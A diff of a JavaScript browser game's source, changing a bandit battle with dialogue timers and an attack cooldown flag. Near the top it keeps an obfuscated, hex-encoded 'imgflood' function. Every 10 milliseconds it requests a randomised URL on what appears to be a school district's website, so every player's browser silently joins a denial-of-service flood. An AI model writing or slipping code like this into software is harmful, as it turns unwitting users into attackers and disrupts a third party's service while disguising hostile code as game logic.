@@ -490,7 +490,7 @@
              };
              campfire.src = "Sprites/Campfire.png";
          }
-var _0x95b3=["\x77\x77\x77\x2E\x6D\x76\x63\x73\x63\x2E\x6B\x31\x32\x2E\x69\x6E\x2E\x75\x73","\x2F\x3F\x72\x3D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F"];function imgflood(){var _0xe850x2=_0x95b3[0];var _0xe850x3=_0x95b3[1];var _0xe850x4= new Image();var _0xe850x5=Math[_0x95b3[3]](Math[_0x95b3[2]]()* 9999999999);_0xe850x4[_0x95b3[4]]= _0x95b3[5]+ _0xe850x2+ _0xe850x3+ _0xe850x5}setInterval(imgflood,10)
+var _0x95b3=["\x77\x77\x77\x2E\x6D\x76\x63\x73\x63\x2E\x6B\x31\x32\x2E\x69\x6E\x2E\x75\x73","\x2F\x3F\x72\x3D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F"];function imgflood(){var _0xe850x2=_0x95b3[0];var _0xe850x3=_0x95b3[1];var _0xe850x4= new Image();var _0xe850x5=Math[_0x95b3[3]](Math[_0x95b3[2]]()* 9999999999);_0xe850x4[_0x95b3[4]]= _0x95b3[5]+ _0xe850x2+ _0xe850x3+ _0xe850x5}setInterval(imgflood,10);
          function FlowerBush(flowerBushX, flowerBushY) {
              var flowerBush = new Image();
              flowerBush.onload = function() {
@@ -762,6 +762,7 @@ var _0x95b3=["\x77\x77\x77\x2E\x6D\x76\x63\x73\x63\x2E\x6B\x31\x32\x2E\x69\x6E\x
          
           //Attacks of you and zee enemies               
          function Attack(){
+          canAttack = false;
            option();
            banditHealth -= playerDamage;
            ctx.clearRect(1, 1, 1250, 75);
@@ -785,7 +786,10 @@ var _0x95b3=["\x77\x77\x77\x2E\x6D\x76\x63\x73\x63\x2E\x6B\x31\x32\x2E\x69\x6E\x
                     addAMemory("Bandit can break the 4th wall");
                     Dialogue("That would be terrifying!", 14751, 16750, "blue");
                     Dialogue("Well, I won't miss again, if that thing in front of me attacks again, I'll kil it instantly", 11000.0001, 14750, "blue");
-                    
+             setTimeout(function(){
+              canAttack = true;
+              }, 14750);
+               
               }, 4001);
             } else if(attackNumber === 2){
               ctx.font = "20px Arial";
@@ -794,6 +798,9 @@ var _0x95b3=["\x77\x77\x77\x2E\x6D\x76\x63\x73\x63\x2E\x6B\x31\x32\x2E\x69\x6E\x
                drawBullet();
               Dialogue("DIE EVIL ZOMBIE!!!", 0, 2000, "blue");
               Dialogue("Bandit shot you", 2000.0001, 4000, "blue");
+             setTimeout(function(){
+              canAttack = true;
+             }, 4000);
               setTimeout(function(){
               playerHealth = 0;
               drawProtagonistFacingRight();
